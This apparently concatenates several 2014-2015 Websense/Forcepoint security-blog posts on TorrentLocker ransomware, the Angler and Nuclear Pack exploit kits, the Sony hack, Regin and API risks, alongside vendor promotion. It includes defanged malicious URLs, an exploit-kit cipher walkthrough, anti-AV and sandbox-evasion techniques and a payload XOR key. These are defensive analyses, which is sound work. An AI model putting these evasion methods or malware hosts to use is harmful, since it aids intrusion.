http://csi.websense.com/\nThis variant of Torrentlocker cycles through hosts with various country code Top Level Domains (ccTLDs).  We observed .com, .at (Austria), .lt (Lithuania) and .ru (Russia).  Variants included:\n \nhxxp://hochim.ru/wp-content/themes/thems/readip.php?eid=8335416278221988351634911194654464864426932877911359115391878239578365375 \n  hxxp://kronbichler.at/wp-content/themes/thems/readip.php?eid=6976374276886957263939312995363812751134728673645492585177832379924246324\n  hxxp://zsohajnowka.pl/wp-content/thems/readip.php?eid=623534149942711528344994141811459\n \nAs mentioned above the fraudalent OSR-themed websites also change frequently to make detection difficult without real-time detection technologies.\nThe Financial Services sector was the one most targeted by this particular campaign.\n \nProtecting from Ransomware\nWebsense customers were protected at the time of this Australian-themed ransomware attack via real-time analytics within ACE, our Advanced Classification Engine. Protection is offered at the different stages of the attack detailed below: \nStage 2 (Lure) - ACE has detection for the email lure, and the website contained within.\n  Stage 3 (Redirect) - ACE has detection for the link inside the email lure, and for the ultimate destination of the counterfeit website.\n  Stage 5 (Dropper) - ACE has detection for the dropped file, as shown by our File Sandboxing report mentioned below.\n  Stage 6 (Backchannel Traffic) - ACE has detection for the command-and-control communication, preventing the malware from functioning correctly.\n \nOur File Sandboxing tool classifies the ransomware payload as Malicious in the report here.\nAt the time of writing (25 February 2015) the file sample has a detection rate of only 3 out of 57 anti-virus vendors in VirusTotal.\nRansomware will continue to evolve as we progress through to 2015.  Once a machine has become infected and files encrypted there is a little that an end user can do to counter it.  To strengthen your overall security posture we recommend that you raise awareness within your employee base of the dangers and signs of ransomware, and adopt suitable technologies to identify and protect from the threat in the early stages of the threat lifecycle.\n \nBlog Contributors: Mark Haffenden, Nicholas Griffin, Carl Leonard.', 'https://www.forcepoint.com/security-labs/ransomware-no-sign-relief-especially-australians\n');

Angler EK is possibly the most sophisticated exploit kit currently used by cyberciminals. It has pioneered solutions that other exploit kits started using later, such as antivirus detection and encrypted dropper files. In addition, Angler tends to be the quickest to integrate the latest zero days, such as the Adobe Flash zero day (CVE-2015-0311) from a few weeks ago, and it employs a notably unique obfuscation. Finally, Angler runs the dropped malware from memory, without ever having to write to the hard drive; this unique technique among exploit kits makes it extremely difficult for traditional antivirus technologies to detect it as they rely on scanning the file system.\n\nWhile Angler is the most advanced exploit kit in today\'s threat landscape, Websense customers are protected from this threat with ACE, our Advanced Classification Engine, at the following stages:\nStage 2 (Lure) - ACE has detection for the compromised websites.\n  Stage 3 (Redirect) - ACE has detection for the injected code that redirects the user to the exploit page.\n  Stage 4 (Exploit Kit) - ACE has detection for the malicious code that attempts to execute this cyber attack.\n  Stage 5 (Dropper Files) - ACE has detection for the binary files associated with this attack\nObfuscation \nAngler\'s landing page consists of four basic parts. Firstly, there is some visible English text, which is used to make the victim of the exploit kit believe they have browsed to a legitimate page. Secondly, it has various deobfuscation routines to deobfuscate the actual malicious scripts. These scripts are located within p class tags and they are encoded as base64. Decoding the base64 strings reveals the actual obfuscated exploit kit code. And finally, the landing page contains several encrypted strings, which contain various URLs leading to the various exploits (Flash, Silverlight, Internet Explorer) included in the kit.\nSamples from Angler landing page\n\n\n\n\nDeobfuscated Exploit Code\nOnce the landing page is deobfuscated, the true nature of the code is revealed. Angler, just like Nuclear and various other exploit kits, uses a very basic second layer obfuscation to make detection by security products even more difficult. \nIt also uses antivirus detection in addition to detecting various virtualization solutions (VMWare, VirtualBox, Parallels) as well as a web debugging proxy called Fiddler, which is widely used by security researchers. Implementing these measures makes it very difficult to observe and investigate this exploit kit in the wild, as most security researchers often rely heavily on these tools. \nDetecting various .sys and .dll files which belong to AV and virtualization software\n\n\nVMWare, VirtualBox, Parallels detection as well as Fiddler web debugging proxy\n\n\nThe most unique feature of Angler is the use of these encrypted URL paths. It uses a simple transposition-based cipher (in layman\'s terms: scrambling the letters) to encrypt and decrypt this data.\n\nThe decryption routine is embedded within the obfuscated part of the exploit kit.\n\nDecryption routine as found in the kit\n\n\nDecryption routine formatted and commented\n\n\nWe will use a very simple example to demonstrate how the decryption works. Suppose our cipher text (encrypted data) is \"TEER CSURH TO PLTAOEL IX TP\" and our decryption key is \"OBFUSCATE\". What Angler does is, it takes the alphabetical order of the letters in the key and rearranges the cipher text based on that. For example:\nOBFUSCATE →  6,2,5,9,7,3,1,8,4\nThis gives us the order of letters in the cipher text. Using this we can easily decrypt it by rearranging the letters.\nExample decryption\n\n\nAnd finally whitespaces are removed from the decrypted string . Obviously, this is an extremely rudimentary form of encryption and would be very easy to crack even without the key if (such as in the above example) the plaintext consisted of actual words. However, Angler uses highly randomised URLs so this kind of encryption is more than sufficient to hide the true nature of these strings and the actual URL paths from various security products.\n\nThe rest of the deobfuscated code follows usual exploit kit patterns: there are various plugin detection and version check routines so the exploit kit \'knows\' which exploit(s) to fire on the target. There are also quite a few shellcode builder routines as Angler uses a multi staged shellcode, where various stages are encoded and get decoded by the previous stages. It also includes a hardcoded encryption/decryption key for the dropper file. \n\nEncryption key for payload\n\n\nMulti stage Shellcode\n\n\nDropper\n\nIf the exploit succeeds, Angler\'s payload is dropped on the victim\'s system. As the payload travels through the network it is still encrypted and gets decrypted later by the final stage shellcode. This technique is used to make detection of the malicious dropper very difficult for traditional intrusion detection systems (IDS). As we mentioned before, Angler uses \'fileless\' droppers, which mean that they are run directly from memory. The dropper used by Angler is called Bedep, which is actually only a downloader - that is, it is not malicious per se, but it is used to download and execute various different malware.\n\nThe payload consists of a combination of shellcode and the Bedep DLL. If the first few bytes of the payload are \"909090\" (NOPs or No Operations in x86 assembly) the DLL will be loaded from the memory, otherwise it will be written to the disk just like a normal dropper file. The shellcode is responsible for running the DLL from memory.\n\n\n\nThe shellcode resolves APIs such as kernel32.dll and wininet.dll\n\n\nSummary\n\nAngler Exploit Kit is no doubt one of the most dangerous exploit kits out there in the wild today. It has various techniques in its arsenal to defeat traditional detection methods such as:\n\nUnique Obfuscation\n  Detects antivirus/virtualization software\n  Encrypted payload\n  Fileless infections\nIn addition Angler is often the first to adopt the latest exploits, which include zero days from time to time. The constantly evolving nature of Angler also highlights the need for security solutions that provide protection across the entire kill chain instead of only focusing on just one stage of it.', 'https://www.forcepoint.com/security-labs/angler-exploit-kit-%E2%80%93-operating-cutting-edge\n');

However, the exploitation of a critical Adobe Flash 0-day vulnerability (CVE-2015-0311, now patched) via the Angler exploit kit has fast-tracked our efforts, and in this blog, we present the strategy adopted by the exploit kit to evade detection of the 0-day by security scanners. 0-days are valuable commodities, and the longer they remain undiscovered, the more value they appropriate for the attacker(s).\n\nJust as defense-in-depth is used as a strategy in the protection scenario, layered obfuscation is its equivalent in the evasion scenario. The attacker is interested in adopting a defense-in-depth approach to protect his / her investment and get the most Return on Investment (ROI) from exploits. A parallel in the physical world is a medieval castle, which was protected by a multiple wall system, so even when the external wall had been taken down by catapults, the so-called inner castle was still standing strong.\n\nThe Angler exploit kit is probably the most sophisticated exploit kit out there today, and its authors are quick at adding new exploits to their arsenal, as well as using new approaches to evade detection. One of the advances the exploit kits authors have made is to be able to directly inject malicious code into the browser’s process memory, as opposed to dropping executables on the potential victim’s machine, thereby making it harder for traditional security products to detect exploitation.\n\nAdobe Flash has always been a good investment for exploit kits, but with the recent decline in the number of Java exploits (because of various advances made by Oracle and the browsers in this regard), attackers seem to be re-focusing their efforts at finding vulnerabilities in Adobe’s products. \n\nTelemetry\n\nHere at Websense Security Labs, as per our estimates, we have blocked over 3 million attempts to more than 2500 URLs believed to be used in threats connected with the Angler Exploit Kit since September 1, 2014.  As we can see from the graph below, we have also observed an increase in the amount of activity seen at the TDS (traffic distribution system) used in this campaign over the past few days:\n\n\n\nThe activity of the Angler exploit kit is depicted in the graph below:\n\n\nLayers of obfuscation\n\nComing to the specific 0-day exploit used by the Angler kit, the flash SWF sample we analyzed contains an obfuscated ActionScript as the first-level wrapper. Obfuscation in ActionScript is similar to other scripting languages: it can be a combination of class, method, and variable name scrambling, string encoding, and even hiding of API calls by making them less obvious in some cases. ActionScript is compiled to p-code, and therefore its compiled code can be further tweaked by the malware writer to make disassembling and decompiling efforts harder. However, the specific sample that was analyzed did not do this.\n\nAs one can observe from the screenshot below, the names are quite meaningless, and just by looking at the decompiled code it is almost impossible to figure out the algorithm. Note that the random names used can be changed by the obfuscation tool to generate different source code with each run, thereby making static detection harder.\n\n\n\nWhat is interesting to note is that there is a string that looks like a base64 encoded stream in there. This provides a hint about what could be done next in the analysis:\n\n\n\nIt did seem promising at first, but simple decoding of the base64 string only produced a scrambled binary without any patterns or hints about the possible encryption method used, or even a high-level idea of the format of the file.\n\n\n\nWhen all else fails, we have no choice but to go back to manual reverse engineering. The objective was to find the decryption method and try to understand the mechanism used, to be able to proceed to the next step. Once that was complete, replacing the original variable and method names with more meaningful ones, the big picture was in front of us (see below):\n\n\nNote that the variable \"this.rtyr\" in the obfuscated code holds the secret to the next step. It is the key used in the decryption method, and therefore we have renamed it to \"key\" above. From here on, it was relatively straightforward to go even further and turn this piece of code into a small script that let us figure out what the binary was doing:\n\n\n\nAs is clear from above – this is a zlib compressed Flash file (CWS file), which makes perfect sense. The 0-day vulnerability is in this flash file, rather than the “wrapper” host flash file.\n\nWhy did the exploit writers do this?\n\nMost security scanners have the ability to scan only the “wrapper” host file. They cannot extract the obfuscated, encrypted, embedded malicious CWS file and scan it. There are too many variables involved to be able to do this on the fly in an automated way – including the keys used, algorithm used for encryption and obfuscation, and so forth.\n\nTo summarize, the exploit writers hid the malicious CWS file under the guise of a legitimate-looking SWF file and used multiple layers of obfuscation, compression, and encryption to evade security scanners. This scenario, while interesting, leads to a very serious question. How is one protected against such attacks?\n\nWebsense customers were already protected against this threat with ACE, our Advanced Classification Engine, at the different stages of the attack detailed below: \n\nStage 3 (Redirect) – ACE has detection for the redirect to the exploit kit landing page.\n  Stage 4 (Exploit Kit) – ACE has detection for the exploit kit landing pages, as well as the Flash Player exploit itself.\n  Stage 6 (Call Home) – ACE detects the communication to the C&C points associated with the Bedep trojan downloader.\nThis case highlights the importance of defense-in-depth and the need to provide protection at multiple stages of the attack kill chain, because merely protecting the wrapper host SWF file would yield little benefit if the attacker changes one byte in the embedded malicious CWS file.\n \nSecurity Researcher: Tamas Rudnai, Contributors: Amy Steier, Ran Mosessco, Rajiv Motwani', 'https://www.forcepoint.com/security-labs/flash-forward-%E2%80%93-angler-here-we-come\n');

It has been used in such high-impact campaigns as the AskMen compromise, and used by the APT group behind Operation Windigo. Nuclear Pack has a wide range of attacks in its repertoire, including Flash, Silverlight, PDF, and Internet Explorer exploits, and it is capable of dropping any malware. Furthermore, Nuclear Pack is constantly being improved by its creators to avoid detection and achieve higher infection rates.\n\nExploit kits are a main source of compromises today; they are one of the primary vehicles for both 0-day and widely effective, known vulnerabilities, offering a free pass to drop active malicious content (such as the banking trojan, Zeus) that embeds on the system giving cyberciminals a way into internal networks and ultimately leads to data exfiltration. Last year Websense has detected and blocked more than 66 million threats specifically with exploit kits, plus over 1 billion catches of later-stages, such as dropper file, C&C traffic (Call Home stage) that are commonly attributable to new exploit kit activity. In essence, exploit kits are complete, off-the-shelf solutions that cybercriminals can buy to compromise systems by exploiting various software vulnerabilities on the victim\'s system. In addition, these kits are equipped to defeat IDS and Anti-Virus solutions in order to avoid detection, the main technique they use to achieve this is through using code obfuscation, which is used to hide the true nature of the malicious code. Exploit kits constantly change and improve in order to keep up with various security solutions and the new version of NuclearPack is the next stage of exploit kit evolution.\n\nTelemetry\nNuclear Pack affects virtually all industries, as it is very often used in high-volume compromises. In addition, the number of exploit attempts varies highly based on the traffic volume of the compromised website, as shown in the charts below.\n\nAffected Industries:\n\n\nNuclear Pack trend activity over time:\n\n\nHigh Level Overview of Nuclear Pack infections\nNuclear Pack follows the traditional kill chain and maps directly to the 7 Stages of Advanced Threats. Websense customers are protected from this threat with ACE, our Advanced Classification Engine, at the following stages:\n\nStage 2 (Lure) - ACE has detection for the compromised websites.\n  Stage 3 (Redirect) - ACE has detection for the injected code that redirects the user to the exploit page.\n  Stage 4 (Exploit Kit) - ACE has detection for the malicious code that attempts to execute this cyber attack.\n  Stage 5 (Dropper Files) - ACE has detection for the binary files associated with this attack.\nThe picture below shows all stages, from the first HTTP transaction with the compromised website. It is worth noting that the original version of Nuclear Pack was seen to use predictable URL patterns. In the new version of Nuclear Pack, the redirect URLs and methods are highly random, making the redirect stage much more difficult to detect.\nNuclear Pack infection chain:\n\n\nObfuscation\nAs with other exploit kits, Nuclear Pack uses various obfuscation techniques to avoid detection by IDS and anti-virus solutions. In order to detect and protect against this threat, it is crucial to understand and identify the obfuscation techniques that are unique to this exploit kit.\nAfter cleaning up the landing page so that it is properly structured, we are still left with highly obfuscated JavaScript code.\n\nCleaned up Landing Page (part I):\n\n\nCleaned up Landing Page (part II):\n\n\nInvestigating the structure of the obfuscated code reveals that it actually consists of only a few parts:\n\nSome helper routines for deobfuscation\n  Obfuscated content (uses decimal format to store the plugin detect and actual exploit part of the exploit kit)\n  Deobfuscation routines\n  The actual deobfuscation\n  Running the deobfuscated JavaScript\nHow Nuclear Pack deobfuscation works\n\n\nIn essence the landing page just takes the obfuscated content, deobfuscates it, and then runs it.\nOne of the most unique Nuclear Pack obfuscation techniques is the use of the background color as means to obfuscate and deobfuscate certain functionality.  The original version of Nuclear Pack always sets the background color of the page to an arbitrary color. Later, the variable document.bgcolor is used to deobfuscate a number of functions, which were obfuscated with hexadecimal HTML color values.\n\nUnique obfuscation method: <body bgcolor=\"#333399\"> is used in the example below\n\n\nDeobfuscated Content\n\nOnce the exploit kit is deobfuscated, the true functionality of the exploit kit is revealed. The deobfuscated code has four parts, and they are executed in the following order:\n\nPlugin Detect\n  XMLDOM Information Disclosure exploit to determine whether anti-virus is running on the system\n  Checking whether victim has vulnerable plugin version\n  Launching appropriate exploit(s)\nNuclear Pack uses the popular PluginDetect library to fingerprint the victim. As you can see, the creators were using the latest version.\nPluginDetect:\n\n\nNuclear Pack uses CVE-2013-7331 XMLDOM ActiveX control vulnerability to enumerate anti-virus software on the target system. Note that the vulnerability only affects Internet Explorer users. The use of this exploit to fingerprint the victim’s machine for anti-virus software is not unique to Nuclear Pack. It is increasingly being adopted by more and more exploit kits (including Angler and RIG). If a specific (hardcoded) anti-virus solution is detected, the infection attempt is aborted in order to avoid possible detection.\nAnti-Virus Detection:\n\n\nBefore launching the actual exploits, Nuclear Pack runs a check to see whether the victim has vulnerable plugin versions. As you can see below, Nuclear Pack also checks for vulnerable Java versions. That functionality is just a placeholder, however; it doesn\'t seem to use any Java exploits.\n\nVulnerable Plugin Check:\n\n\nFinally, based on the results of the previous check, the exploit kit runs the appropriate exploit or exploits.\n\nLaunching Exploits\n\n\nNew version of Nuclear Pack \n\nDuring December, a new version of Nuclear Pack emerged. While it has only been used on a low scale at this point, it is very likely that this new version will completely replace the old version. As with any new software release, the new version of Nuclear Pack has new features and various improvements. \nThe biggest difference between the new version and its predecessor is that it uses completely different obfuscation techniques to hide malicious code from security products. \nLanding page using the new obfuscation\n\nIn addition to the complete overhaul of it\'s obfuscation methods, Nuclear Pack now uses a rudimentary second-layer obfuscation. In other words, there is another layer of obfuscation. It is very basic, even human-readable, but probably useful against security products that can only deal with one layer of obfuscation. To increase infection rates even further, Nuclear Pack has detection for more anti-virus products.\nSecond layer obfuscation and AV detection:\n\nIn the past, NuclearPack also used to use simple URL patterns specific to only this exploit kit. With the new version this is no longer the case. Also, a large chunk of the original PluginDetect library is gone, leaving only the essentials. This makes Nuclear Pack more streamlined and efficient.\nThe creators of NuclearPack also introduced a XOR based obfuscation method for the malware payload, which makes it significantly more difficult to detect the dropper file with IDS or anti-virus as no signatures will match on the encoded payload. Websense File Sandboxing reports the dropped executable as malicious.\nMalware Payload XOR-ed with ASCII string \"kFLzT\" \n\n\nWebsense File Sandboxing report showing detection as Malicious:\n\nFinally, the new version only uses Flash (CVE-2014-8439) and Silverlight (CVE-2013-0074 / CVE-2013-3896) exploits. This seems to be a general trend among various exploit kits; they drop Java, Internet Explorer, and PDF exploits in favor of the more successful Flash and Silverlight exploits. There are two main reasons behind this: first, Flash and Silverlight are widely used plugins, while Java and Adobe Reader plugins are becoming less common. Also, due to the diversity of the browser market, it\'s becoming less profitable to use Internet Explorer exploits. Secondly, while browser security has steadily increased over the past few years, different plugins seem to lag behind in terms of security.\nSummary\nNuclear Pack is a constantly evolving threat, which uses various exploits to compromise a large number of systems.\n  The obfuscation used by different exploit kits, while constantly changing, is unique to each kit, making fingerprinting easier.\n  Flash and Silverlight are the most commonly used exploits\nFor a thorough description of the underground ecosystem surrounding Exploit Kits, see Kafeine’s blog:http://malware.dontneedcoffee.com/2012/12/eyeglanceru.html', 'https://www.forcepoint.com/security-labs/happy-nuclyear-evolution-exploit-kit\n');

Although it is one of the most serious breaches that we have seen so far, we will see breaches of this magnitude in the days and months ahead as IT departments continue to grapple with the challenges of targeted attacks like these. While Sony deals with the hack by trying to sabotage downloads of its stolen data through putting out a large number of torrent file-sharing nodes with fake seeds, we at Websense Labs have been busy trying to protect our customers from such attacks. We initially released coverage on 2nd of December to protect customers from the malware used in the attack on SPE, and we will continue to monitor the situation and enhance our protection as required.  \n\nWebsense customers are protected against known Indicators Of Compromise with ACE, our Advanced Classification Engine, at the different stages of the attack detailed below:\n\nStage 5 (Dropper) – ACE has detection for the malicious files delivered by this threat.\n	Stage 6 (Call Home) – ACE detects the communication to the C&C points associated with this threat.\nExecutive Summary\n\nThe initial malware used in this attack was a Server Message Block (SMB) worm that spread laterally throughout the network. The secondary malware included a backdoor as well as Master Boot Record (MBR) and hard-drive erasing tools.\n	The malware actors held data for ransom, before proceeding to release it publicly. Their motives, however, remain unclear.\n	Attribution for this attack is difficult, if not impossible, despite heavy links to North Korean actors.\nInfection vector\n\nFrom a technical perspective, the attack kill chain was typical of an infection scenario. The attack possibly started with a phishing email or a machine that got infected via other means, with some reports hinting that an insider was responsible. The infection was an SMB worm that brute-forced credentials in order to spread from one system to another, while constantly sending updates back to the hard-coded command and control servers. From there on, various tools including back doors, a proxy, a hard drive eraser tool, an MBR eraser, etc. went about doing their job of data exfiltration, wiping out hard drives, and erasing master boot records (MBRs). US-CERT has done a great job of putting together details of the specific files being dropped and executed at https://www.us-cert.gov/ncas/alerts/TA14-353A. \n\nAims of the Malicious Actors\n\nIt is clear that data is at the heart of the attack against Sony. Data was held ransom by the \'Guardians of Peace\', the group that claimed responsibility for the hack. They blackmailed Sony, and a massive 200 GB of sensitive data has been made public by the group so far, with threats to release more data in the days to come. Exfiltration of such a large amount of sensitive data from the perimeter of any organization ought to have raised some kind of alarm. Therefore, it is essential to understand the data that exists in the organization in an automated way and protect it according to its risk classification. Data discovery, data identification, data classification, and explicit action as a result of the data policy is at the heart of the analytics in the Websense Advanced Classification Engine (ACE) and ThreatSeeker Intelligence Cloud. \n\nThe hack itself is well orchestrated, but is atypical in many ways from the state-sponsored cyber war that this attack is believed to be.\n\nThe real intent of the group in question is unclear and thus leaves many questions unanswered. Initially it appeared to be mercenary, but why would Sony\'s pulling of the movie in question, \"The Interview\", appease them in any way? Now that Sony\'s data is in ransom, what else does the attacker want? Sony\'s data has already left the building and unlike in the physical world, there is no way to \"return\" all the copies of the data. On the topic of attribution, is this really the group that carried out the attack and are there any other victims? \nAs to the sophistication of the malware itself; it is no Stuxnet. It definitely did not take millions of dollars to piece together the whole attack and the malware did little to cover its tracks. Attribution of cyber-attacks is one of the most difficult things and the term \"cyber-war\", though thrown around a lot in the news, is not as simplistic as it appears. For starters, the clues could be red herrings. Plausible deniability also has a big role to play in the virtual world. \nThe code was simple, not highly obfuscated, and the command and control communication was also not unusual in any way. \nSome of the malware was written specifically for SPE.

This means frequently re-evaluating existing defenses and practices to meet the rapid changes inherent in managing critical data in a connected world.\nIf you’re not routinely reevaluating current systems and practices, or have yet to consider what steps to take to protect your organization, these simple recommendations will get you started on enhancing your security position to meet the challenges of a new year.\n\n\n    Perform a check against the regulations to which both you AND your customers are subject.\n    This can take many forms, from government regulations and contractual obligations, to those required as a result of membership in a trade association or via certifications and accreditations.\n    This can take many forms, from government regulations and contractual obligations, to those required as a result of membership in a trade association or via certifications and accreditations.\n    \n    \n    \n    Holistically evaluate your organization’s preparedness procedures.\n    \n    Is your business set up to handle the latest cyber threats? Does my business look similar to others that have been victims lately, whether the threat is from hacktivism, cyber criminals, cyber terrorists. Do you have policies and procedures in place for a potential attack? Is an encryption program in place to prevent third parties from recovering sensitive data should it be lost? Do you know where your data is, who has access to it and how? These are just some of the questions you should answer to determine your readiness in the event of an attack.\n    \n    \n    \n    Get pro-active:  perform a threat strategy assessment.\n    Ideally, threat analysis should be a recurring process, performed at frequent intervals to establish that current security defenses are working as intended. However, if your organization has not done so in the last 12 months, both internal and external information vulnerabilities need to be matched against real-world attacks. Testing current threats against your organization’s safeguards and best practices in varying conditions will give you a clearer picture of the integrity of your security systems.\n    \nLastly, do a personal audit of your own passwords and security defenses. Passwords should be changed regularly, but without being prompted or compelled to do so – as businesses often require of employees - we often become complacent and leave ourselves vulnerable. Security tools must also be updated to perform effectively. Be sure you’ve downloaded and installed the latest versions of the tools you use so that security patches and other necessary refreshes of critical features enable them to operate successfully.\n\n*according to idtheftcenter.org, Dec. 2, 2014', 'https://www.forcepoint.com/security-labs/tis-season-%E2%80%A6reassessing-your-security-posture\n');

The use of UDP and TCP have also been observed.  Further, custom encryption based on existing algorithms seek to hide the transmission of stolen data from solutions not looking out for the use of such custom encryption.\nStage 7 (Data Theft): Reports show that data stolen by the toolkit is not always committed to disk, instead sealed in memory only making analysis difficult.\nConclusion\nRegin uses many complex methods to evade detection and make analysis difficult.  The observed trend indicates the complexity of such malware will continue to increase as malware authors fine-tune their skills and adopt such modular and multi-stage malware.\nAs we continue our analysis and discover further Indicators of Compromise, we shall continue to enhance our protection using ACE, our Advanced Classification Engine.  We have configured our ThreatSeeker® Intelligence Cloud to seek out further Indicators of Compromise and we are using technologies such as Yara to help achieve that and supplement our own analytics.', 'https://www.forcepoint.com/security-labs/what-protection-can-be-offered-sophisticated-malware-such-regin\n');

This should cause great concern for these organisations, for the following reasons:\nInadequate or \'bare essentials\' security leaves an organisation vulnerable to an ever-increasing number of threats.\n  Teams who perceive a lack of investment into corporate security may become discouraged that their roles and responsibilities are not being taken seriously enough.\n  Projects to completely overhaul security solutions - as with any system so widespread throughout and integral to the company - will require significant resource commitment and budget.\nA contributing factor to this desire to refresh security is the frequent (47 percent) disappointment in the level of protection provided by current security solutions, with only 12 percent of respondents having never been disappointed. This may be the result of a number of factors, such as:\nPerceived inadequate vendor response to latest threatsWhen a new threat is discovered, you want to be certain that your vendor is protecting you in real-time, or distributing the fastest possible update. Even a simple alert that your security solution does protect you or is being updated will engender confidence, whilst silence or an admission of vulnerability will promote uncertainty and concern.\n  Actual failure to protect against a threat\n    If you are the victim of an advanced threat or data theft, you need to have a serious conversation with your vendor. Did the threat exploit a weakness, or was the product\'s coverage not sufficient, or not appropriate, to defend against it. It may be that your security solution covers only certain parts of the \"Cyber Attack Kill Chain\", and is not able to protect you against particular attack channels, such as targeted phishing attacks or the latest exploit kits.\n  Legacy countermeasures not offering sufficient protection\n    Many organisations may still be relying on a security countermeasure that, although powerful when it was first implemented, is inadequate to cope with today\'s targeted and advanced threats. When industry became aware of online security issues, the focus was on anti-virus and firewalls to protect the individual and organisation. Modern security needs include protection from sophisticated web-based malware, targeted phishing attacks and data theft. If your security solution has not evolved with the threat landscape, your vulnerability is increasing with each new attack.\nEncouragingly, 49 percent of respondents said that they were planning to make significant investments and adjustments to their cyber security defences in the 12 months following the report. The catalyst for this could be a recent security breach or a review of existing solutions which has highlighted deficiencies. Whatever the root cause, organisations which have committed to investment in this area should be conducting wide-ranging research, on the threats they are likely to face and the security solutions which can comprehensively protect against them. Respected and trusted industry analyst reports can provide significant support to these efforts, giving a balanced view on the strengths and weaknesses of products and vendors. However, security teams must be able to understand both their business and technology requirements, vulnerabilities and risks against the likelihood of a threat targeting their most critical assets.\nIt is all too easy to discount the danger of today\'s threat landscape, until the threat is at (or already through) our door, but it is something that no organisation can afford to be complacent about. As well as increasing sophistication, attacks occur with great frequency, particularly to the larger, most recognizable organisations. As noted by JPMorgan after their recent data breach, \"Companies of our size unfortunately experience cyber attacks nearly every day.\" Keeping your security optimised is a never-ending process, but one that is essential to best protect your organisation, individuals and data.\nI recommend that you download the 2014 Ponemon Report to see the full findings.', 'https://www.forcepoint.com/insights/time-refresh-overhauling-security-technology-and-systems\n');

These photographs were allegedly obtained through a brute force attack on Apple\'s cloud storage sites and services to which the photographs had been uploaded. Beyond \"change your iCloud settings,\" what practical takeaways does this incident provide and how can we safely use convenient cloud and mobile services for work and play?\nFirst, we must acknowledge the risk. The loss of sensitive data though the use of connected devices was highlighted in the Websense Labs 2014 predictions, \"Attackers will be more interested in cloud data than your network\" and, \"Cybercriminals will target the weakest links in the \"data-exchange chain.\" You can download your own copy of the report here: http://www.websense.com/content/websense-2014-security-predictions-report.aspx.\nRealistically, we are going to use the cloud and our mobile devices both for work and personal data as the convenience of availability enables us to be more effective in our jobs and to share with our friends and family. However, with convenience comes responsibility, so with both our business data and our personal data we should all be more mindful and have a standard protocol for safely integrating the use of these technologies.\nRemember, the cloud is not a substitute for good data management practices, but by having a data use, creation and collection plan you canminimize the risk of threats to you or your organization.\nThis plan can be as simple as proactively examining: what data you want to create and share; what you plan to use the data for; and knowing where that data will be collected and stored.\nFor businesses a data use and classification plan simply gets users on the same page and can help avoid costly data loss issues. For personal use, this doesn\'t need to be a big written policy. You simply must make a proactive choice on what you want to share to avoid later surprises.\nHere are a couple of steps that I take in both my personal and professional life that may help guide your use of these convenient services:\n1. Establish rules for what data can go into the cloud\nAs an organization the first step toward safe cloud and mobile use is to acknowledge that there is risk in these applications. Some data should never go to the cloud, without stringent protections. So go through the process of defining sensitive or high value data, communicating that definition to employees and executives and then reinforce this learning through repetition, imagery and patterns. For your personal data plan that also means educating family members (especially younger, internet active types). It is also beneficial to know how to remove data that accidentally gets into the cloud.\n2. Identify and take steps to shore up the weakest links in your data-exchange chain.\nWeak passwords remain a consistent and ongoing problem. Whereever possible use strong 2 factor authentication for highly sensitive data. Challenge questions and images are not recommended as those can be compromised relatively easily. Instead, consider out of band authentication such as mobile device proximity, tokens, call backs to a secondary phone number, biometrics and one time passwords - all of which can reduce the risk of accidental or intentional disclosures.\nOther weak links to consider include business cloud apps on mobile devices without appropriate monitoring or limits and improperly secured mobile devices (PIN, automatic recovery or wipe capabilities).\n3. Know what to do if there is a breach\nAs an organization you also must be prepared with a good reporting process for accidental loss. If you are going to take the risk that data may be lost or leaked at some point, you must prepare for that as a possible eventuality. You should be prepared to rapidly identify how important the disclosed data is and any potential ramifications. Be ready with a a plan to identify who you contact and in what order to contact them. This includes law enforcement (usually your first contact), others with whom you share the data and the originators (or owners) of the data that was breached.\nFor more information on safe data management practices, please visit https://www.getsafeonline.org.', 'https://www.forcepoint.com/insights/celebrity-photo-data-hack-lessons-businesses-and-consumers\n');

Externalized APIs are enabling new information sharing paradigms between business partners, and increasing consumer input of ePHI and PII directly to organizations servers. As CISOs, we need to be mindful of these business practices and ensure proper risk management over the data flowing through these APIs, which can become targets of interest for cybercriminals or other malicious actors.\nThe Black Hat discussion focused both on offensive risk (where are attackers finding success) and defensive tactics to improve overall API security. Here are some of the key takeaways:\n\nOn the offensive side, attacks across programming languages and application stacks but fall into in several consistent categories:\nBypassing authorization schemes\n    Bypassing data validation\n    Evading API limits\nBypassing Authorization\n\nA primary focus of an externalized API is the correct authorization for the specific API call. Proper authorization is the first step in bounding the scope of the requestor to the desired limits of the API developer. However, designing proper authorization models that correctly flow through the entire application stack is not an easy task. Some of the offensive techniques shared include the following:\nFinding secrets embedded in applications, authorization keys for example\n  Substituting an identity in an html request with an injection because the identity is visible\n  Failure to validate that the API is authorized before the code starts parsing the request\n  Intercepting the multifactor authorization required check and returning \"no\" effectively deprecating the authentication to single factor\n  Lack of good device identification and failure to tie the device ID to the authorized user\n  Losing the original identity of the requestor as the request gets passed through the API stack\n  Password enrollment and recovery having different processing paths with different assurance models\nBypassing Data Validation\nVerifying that the data included in an API request is within scope, format and character is an ongoing battle for developers. There is a well-known tradeoff between verifying every input field at every level in the call stack and efficiency. The participants shared some common logic and design flaws that can be readily exploited. For example,\nEntering the API stack from a different workflow entry point, effectively bypassing input verification.\n  Finding and leveraging developer or debug APIs left in production code\n  Rolling back an API call but leaving the code execution privilege higher than the original requestor\'s privilege.\nEvading API Limits\nThe third category of API circumvention technique discussed was evading API Limits. API limits are designed to mitigate a number of risks such as denial of service, mass data exfiltration, over consumption of resources by a few parties, etc. The round table participants highlighted the following as examples of practices that lead to API limit circumvention.\nXforwarder injections\n  Overrunning limits that are established on APIs but aren\'t enforced correctly\n  Finding and exploiting APIs that should have limits but don\'t (for example enumerating through an entire database)\n  Losing the original authentication or authorization context so you can\'t apply the correct limits\nDefending APIs from potential vulnerabilities and targeted attacks\nThe group also discussed what techniques and mitigation strategies they are evangelizing or deploying within their organizations. While not all of these techniques are practical - for example if you have legacy unmodifiable code, knowing your risk is the first step to mitigation. The group suggested both design philosophy as well as practical implementation tips including:\nExpect APIs and Methods to be discovered and program accordingly, don\'t rely on obscurity to keep a hacker from                 locating and exploiting your APIs.\n    Use graphing and instrumentation of the APIs to monitor API use for abuse and to discover APIs that were not intended to be external facing.\n    Design in the ability to enumerate and revoke API keys.\n    Use existing tools and vetted libraries rather than creating your own, especially in conceptually complex areas examples including:\n           a.     Cryptography\n           b.     Authorization - xacml 3.0 for example\n           c.     Authentication - google Oauth library\n    Break APIs into micro services, which run on separate instances or servers and are firewalled so only appropriate API traffic is allowed.\n    Design in versioning on your APIs, even if they are not public, for compatibility and future proofing.\n    Correlate API logs across servers for better visibility.\nThis roundtable was specifically focused on reducing API risk 